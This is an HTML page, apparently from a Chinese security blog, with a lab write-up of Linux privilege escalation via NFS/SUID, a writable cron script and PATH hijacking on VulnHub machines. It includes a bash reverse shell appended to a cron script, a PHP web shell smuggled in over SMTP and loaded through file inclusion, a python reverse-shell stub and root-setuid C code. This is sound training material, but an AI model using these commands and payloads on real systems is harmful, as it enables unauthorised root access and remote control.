@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFS、PATH、Cron 任务提权总结与复现记录</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@NFS、PATH、Cron 任务提权总结与复现记录 - Hzhsec home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/3.nfs_path_cron%E6%8F%90%E6%9D%83/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">
+
+    
+
+
+<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>
+
+    <meta property="og:title" content="NFS、PATH、Cron 任务提权总结与复现记录" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/3.nfs_path_cron%E6%8F%90%E6%9D%83/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-10-29T21:30:00+08:00" />
+<meta property="article:modified_time" content="2025-10-29T21:30:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NFS、PATH、Cron 任务提权总结与复现记录"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://www.hzhsec.top/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "NFS、PATH、Cron 任务提权总结与复现记录",
+      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/3.nfs_path_cron%E6%8F%90%E6%9D%83/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NFS、PATH、Cron 任务提权总结与复现记录",
+  "name": "NFS、PATH、Cron 任务提权总结与复现记录",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "本文复现 NFS、Cron 与 PATH 环境变量三种典型提权方式，对复现过程、利用条件、完整命令及思路做详解备份，适用于渗透测试学习与实验环境复现，不适用于生产攻击。\nNFS 提权 📌 NFS 基础说明 NFS 是一种基于 TCP/IP 的网络文件系统协议，通过 NFS，客户端可以像本地磁盘一样访问远程共享目录。\nVirtualBox 复现注意事项（坑点） VirtualBox 必须开启 两块网卡：\n1️⃣ NAT → 访问外网\n2️⃣ Host-Only → 内网互通 推荐开启 DHCP 动态获取 IP 官方下载地址：\nhttps://www.virtualbox.org/wiki/Downloads 若只开单网卡可能导致无法访问内网靶机 靶场环境 https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/\n利用前置条件：\nNFS 服务开启 拥有普通用户权限或 WebShell 权限 1️⃣ 信息收集 nmap 192.168.1.6 http://192.168.1.6/file.php?file=/etc/passwd 2️⃣ 利用 NFS 服务 确认 NFS 开启\n查看可挂载目录：\nshowmount -e 192.168.1.6 挂载共享目录：\nmkdir nfs sudo mount -t nfs 192.168..56.4:/mnt/nfs ./nfs chmod 777 shell.php 3️⃣ 结合 SUID 提权 ⚠ 重点提示：gcc 编译环境版本必须与目标系统内核接近，否则提权文件可能失效\n示例 C 代码：\n#include #include int main() { setuid(0); system(\"id\"); system(\"whoami\"); } 目标机器系统信息：\nStatic hostname: hacksudo Operating System: Ubuntu 20.10 Kernel: Linux 5.8.0-45-generic Architecture: x86-64 Virtualization: oracle 使用 Docker 构建相同版本环境编译 创建 Dockerfile：\ncat \u003e Dockerfile \u003c\u003c'EOF' FROM ubuntu:20.10 RUN sed -i 's|archive.ubuntu.com|old-releases.ubuntu.com|g' /etc/apt/sources.list \u0026\u0026 \\ sed -i 's|security.ubuntu.com|old-releases.ubuntu.com|g' /etc/apt/sources.list \u0026\u0026 \\ apt update \u0026\u0026 apt install -y build-essential \u0026\u0026 \\ rm -rf /var/lib/apt/lists/* WORKDIR /src EOF docker build -t ubuntu20.10-gcc . 编译：\ndocker run --rm -v \"$(pwd)\":/src -w /src ubuntu20.10-gcc bash -c \"gcc -O2 -Wno-unused-result -o hzhsec hzhsec.c\" 或本地直接尝试：\ngcc hzhsec.c -o hzhsec 赋予 SUID 权限并触发 cp hzhsec /root/nfs chmod +s hzhsec 验证：\nfind / -perm -u=s -type f 2\u003e/dev/null cd /mnt/nfs ./hzhsec 成功验证\nCron 定时任务提权 环境 https://www.vulnhub.com/entry/jarbas-1,232/\n条件：\n用户或 WebShell 权限 可修改 Cron 定时任务脚本 1️⃣ 信息收集 访问入口：\nhttp://192.168.139.152/access.html 2️⃣ 获取用户或 Shell 权限 访问 Jenkins：\nhttp://192.168.139.152:8080/ 创建任务、构建 payload\n3️⃣ Cron 提权流程 查看 Cron 配置：\ncat /etc/crontab 查看可执行脚本权限：\ncat /etc/script/CleaningScript.sh ls -lia /etc/script/CleaningScript.sh 追加反弹 Shell：\necho \"bash -i \u003e\u0026 /dev/tcp/192.168.88.145/4567 0\u003e\u00261\" \u003e\u003e /etc/script/CleaningScript.sh 成功反弹 ✔\nPATH 环境变量劫持提权 PATH 提权的核心原理：\n仅适用于 SUID 可执行文件，不适用于 sudo\n因为 sudo 使用 root 自己的安全环境变量\n环境 https://www.vulnhub.com/entry/symfonos-1,322/\n条件：\n拥有用户权限 存在可被逆向分析出系统命令调用的 SUID 程序 1️⃣ 信息收集 smbclient -L 192.168.88.151 端口信息显示 SMB 存在\n2️⃣ 访问共享与漏洞发现 smbclient //192.168.88.151/anonymous smbclient //192.168.88.151/helios -U helios 猜测弱口令：\nhelios / qwerty 成功登录 /h3l105\n发现 WordPress：\nhttp://192.168.88.151/h3l105/ 扫描插件：\nwpscan --url http://192.168.88.151/h3l105/ --plugins-detection aggressive 发现 mail-masta 1.0 文件包含\n查询漏洞：\nsearchsploit mail masta 1.0 利用：\nhttp://192.168.88.151/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd 3️⃣ 反弹 Shell 通过邮件服务写入 PHP payload：\n/var/mail/helios telnet 192.168.88.151 25 MAIL FROM: MALABIS RCPT TO: helios data \u003c?php system($_POST['shell']); ?\u003e . QUIT 反弹：\npython -c 'import socket,subprocess,os;s=socket.socket(...' 4️⃣ PATH 劫持提权核心步骤 交互式 Shell：\npython -c 'import pty;pty.spawn(\"/bin/bash\")' 寻找 SUID：\nfind / -perm -u=s -type f 2\u003e/dev/null 发现 /opt/statuscheck\n逆向分析：\nstrings /opt/statuscheck 找到被调用的命令 = curl\n构造伪 curl： cd /tmp echo \"/bin/sh\" \u003e curl chmod 777 curl export PATH=/tmp:$PATH echo $PATH 触发提权：\n/opt/statuscheck ",
+  "wordCount" : "374",
+  "inLanguage": "en",
+  "datePublished": "2025-10-29T21:30:00+08:00",
+  "dateModified": "2025-10-29T21:30:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/3.nfs_path_cron%E6%8F%90%E6%9D%83/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://www.hzhsec.top/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>NFS、PATH、Cron 任务提权总结与复现记录</h1>
+  </header>
+
+  <p>
+  <small>
+    October 29, 2025&nbsp;· 374 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-nfs-基础说明">📌 NFS 基础说明</a>
+      <ul>
+        <li><a href="#virtualbox-复现注意事项坑点">VirtualBox 复现注意事项（坑点）</a></li>
+        <li><a href="#靶场环境">靶场环境</a></li>
+      </ul>
+    </li>
+    <li><a href="#1-信息收集">1️⃣ 信息收集</a></li>
+    <li><a href="#2-利用-nfs-服务">2️⃣ 利用 NFS 服务</a></li>
+    <li><a href="#3-结合-suid-提权">3️⃣ 结合 SUID 提权</a>
+      <ul>
+        <li><a href="#使用-docker-构建相同版本环境编译">使用 Docker 构建相同版本环境编译</a></li>
+        <li><a href="#赋予-suid-权限并触发">赋予 SUID 权限并触发</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#环境">环境</a></li>
+    <li><a href="#1-信息收集-1">1️⃣ 信息收集</a></li>
+    <li><a href="#2-获取用户或-shell-权限">2️⃣ 获取用户或 Shell 权限</a></li>
+    <li><a href="#3-cron-提权流程">3️⃣ Cron 提权流程</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#环境-1">环境</a></li>
+    <li><a href="#1-信息收集-2">1️⃣ 信息收集</a></li>
+    <li><a href="#2-访问共享与漏洞发现">2️⃣ 访问共享与漏洞发现</a></li>
+    <li><a href="#3-反弹-shell">3️⃣ 反弹 Shell</a></li>
+    <li><a href="#4-path-劫持提权核心步骤">4️⃣ PATH 劫持提权核心步骤</a>
+      <ul>
+        <li><a href="#构造伪-curl">构造伪 curl：</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><p>本文复现 NFS、Cron 与 PATH 环境变量三种典型提权方式，对复现过程、利用条件、完整命令及思路做详解备份，适用于渗透测试学习与实验环境复现，不适用于生产攻击。</p>
+<hr>
+<h1 id="nfs-提权">NFS 提权</h1>
+<h2 id="-nfs-基础说明">📌 NFS 基础说明</h2>
+<p>NFS 是一种基于 TCP/IP 的网络文件系统协议，通过 NFS，客户端可以像本地磁盘一样访问远程共享目录。</p>
+<h3 id="virtualbox-复现注意事项坑点">VirtualBox 复现注意事项（坑点）</h3>
+<ul>
+<li>VirtualBox 必须开启 <strong>两块网卡</strong>：<br>
+1️⃣ NAT → 访问外网<br>
+2️⃣ Host-Only → 内网互通</li>
+<li>推荐开启 DHCP 动态获取 IP</li>
+<li>官方下载地址：<br>
+<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></li>
+<li>若只开单网卡可能导致无法访问内网靶机</li>
+</ul>
+<h3 id="靶场环境">靶场环境</h3>
+<p><a href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</a></p>
+<p><strong>利用前置条件：</strong></p>
+<ul>
+<li>NFS 服务开启</li>
+<li>拥有普通用户权限或 WebShell 权限</li>
+</ul>
+<hr>
+<h2 id="1-信息收集">1️⃣ 信息收集</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 192.168.1.6
+</span></span><span style="display:flex;"><span>http://192.168.1.6/file.php?file<span style="color:#f92672">=</span>/etc/passwd
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 204123.png" alt="屏幕截图 2025-10-29 204123.png"></p>
+<hr>
+<h2 id="2-利用-nfs-服务">2️⃣ 利用 NFS 服务</h2>
+<p>确认 NFS 开启</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 204217.png" alt="屏幕截图 2025-10-29 204217.png"></p>
+<p>查看可挂载目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount -e 192.168.1.6
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 204340.png" alt="屏幕截图 2025-10-29 204340.png"></p>
+<p>挂载共享目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir nfs
+</span></span><span style="display:flex;"><span>sudo mount -t nfs 192.168..56.4:/mnt/nfs ./nfs
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> shell.php
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 205506.png" alt="屏幕截图 2025-10-29 205506.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 205712.png" alt="屏幕截图 2025-10-29 205712.png"></p>
+<hr>
+<h2 id="3-结合-suid-提权">3️⃣ 结合 SUID 提权</h2>
+<p>⚠ 重点提示：<strong>gcc 编译环境版本必须与目标系统内核接近，否则提权文件可能失效</strong></p>
+<p>示例 C 代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;id&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;whoami&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>目标机器系统信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Static hostname: hacksudo
+</span></span><span style="display:flex;"><span>Operating System: Ubuntu 20.10
+</span></span><span style="display:flex;"><span>Kernel: Linux 5.8.0-45-generic
+</span></span><span style="display:flex;"><span>Architecture: x86-64
+</span></span><span style="display:flex;"><span>Virtualization: oracle
+</span></span></code></pre></div><hr>
+<h3 id="使用-docker-构建相同版本环境编译">使用 Docker 构建相同版本环境编译</h3>
+<p>创建 Dockerfile：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; Dockerfile <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FROM ubuntu:20.10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RUN sed -i &#39;s|archive.ubuntu.com|old-releases.ubuntu.com|g&#39; /etc/apt/sources.list &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sed -i &#39;s|security.ubuntu.com|old-releases.ubuntu.com|g&#39; /etc/apt/sources.list &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    apt update &amp;&amp; apt install -y build-essential &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    rm -rf /var/lib/apt/lists/*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WORKDIR /src
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker build -t ubuntu20.10-gcc .
+</span></span></code></pre></div><p>编译：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -v <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>:/src -w /src ubuntu20.10-gcc bash -c <span style="color:#e6db74">&#34;gcc -O2 -Wno-unused-result -o hzhsec hzhsec.c&#34;</span>
+</span></span></code></pre></div><p>或本地直接尝试：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc hzhsec.c -o hzhsec
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 215325.png" alt="屏幕截图 2025-10-29 215325.png"></p>
+<hr>
+<h3 id="赋予-suid-权限并触发">赋予 SUID 权限并触发</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp hzhsec /root/nfs
+</span></span><span style="display:flex;"><span>chmod +s hzhsec
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 215446.png" alt="屏幕截图 2025-10-29 215446.png"></p>
+<p>验证：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>cd /mnt/nfs
+</span></span><span style="display:flex;"><span>./hzhsec
+</span></span></code></pre></div><p>成功验证</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 215652.png" alt="屏幕截图 2025-10-29 215652.png"></p>
+<hr>
+<h1 id="cron-定时任务提权">Cron 定时任务提权</h1>
+<h2 id="环境">环境</h2>
+<p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p>
+<p>条件：</p>
+<ul>
+<li>用户或 WebShell 权限</li>
+<li>可修改 Cron 定时任务脚本</li>
+</ul>
+<hr>
+<h2 id="1-信息收集-1">1️⃣ 信息收集</h2>
+<p>访问入口：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.139.152/access.html
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 185047.png" alt="屏幕截图 2025-10-29 185047.png"></p>
+<hr>
+<h2 id="2-获取用户或-shell-权限">2️⃣ 获取用户或 Shell 权限</h2>
+<p>访问 Jenkins：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.139.152:8080/
+</span></span></code></pre></div><p>创建任务、构建 payload</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 185714.png" alt="屏幕截图 2025-10-29 185714.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 185731.png" alt="屏幕截图 2025-10-29 185731.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 185831.png" alt="屏幕截图 2025-10-29 185831.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 185854.png" alt="屏幕截图 2025-10-29 185854.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 185908.png" alt="屏幕截图 2025-10-29 185908.png"></p>
+<hr>
+<h2 id="3-cron-提权流程">3️⃣ Cron 提权流程</h2>
+<p>查看 Cron 配置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/crontab
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 190114.png" alt="屏幕截图 2025-10-29 190114.png"></p>
+<p>查看可执行脚本权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/script/CleaningScript.sh
+</span></span><span style="display:flex;"><span>ls -lia /etc/script/CleaningScript.sh
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 190449.png" alt="屏幕截图 2025-10-29 190449.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 190414.png" alt="屏幕截图 2025-10-29 190414.png"></p>
+<p>追加反弹 Shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.88.145/4567 0&gt;&amp;1&#34;</span> &gt;&gt; /etc/script/CleaningScript.sh
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 190631.png" alt="屏幕截图 2025-10-29 190631.png"></p>
+<p>成功反弹 ✔</p>
+<hr>
+<h1 id="path-环境变量劫持提权">PATH 环境变量劫持提权</h1>
+<p>PATH 提权的核心原理：</p>
+<blockquote>
+<p><strong>仅适用于 SUID 可执行文件，不适用于 sudo</strong><br>
+因为 sudo 使用 root 自己的安全环境变量</p>
+</blockquote>
+<hr>
+<h2 id="环境-1">环境</h2>
+<p><a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p>
+<p>条件：</p>
+<ul>
+<li>拥有用户权限</li>
+<li>存在可被逆向分析出系统命令调用的 SUID 程序</li>
+</ul>
+<hr>
+<h2 id="1-信息收集-2">1️⃣ 信息收集</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L 192.168.88.151
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-29 223227.png" alt="屏幕截图 2025-10-29 223227.png"></p>
+<p>端口信息显示 SMB 存在</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 220657.png" alt="屏幕截图 2025-10-29 220657.png"></p>
+<hr>
+<h2 id="2-访问共享与漏洞发现">2️⃣ 访问共享与漏洞发现</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbclient //192.168.88.151/anonymous
+</span></span><span style="display:flex;"><span>smbclient //192.168.88.151/helios -U helios
+</span></span></code></pre></div><p>猜测弱口令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>helios / qwerty
+</span></span></code></pre></div><p>成功登录 /h3l105</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 223517.png" alt="屏幕截图 2025-10-29 223517.png"></p>
+<p>发现 WordPress：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.88.151/h3l105/
+</span></span></code></pre></div><p>扫描插件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://192.168.88.151/h3l105/ --plugins-detection aggressive
+</span></span></code></pre></div><p>发现 mail-masta 1.0 文件包含</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-29 225028.png" alt="屏幕截图 2025-10-29 225028.png"></p>
+<p>查询漏洞：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>searchsploit mail masta 1.0
+</span></span></code></pre></div><p>利用：</p>
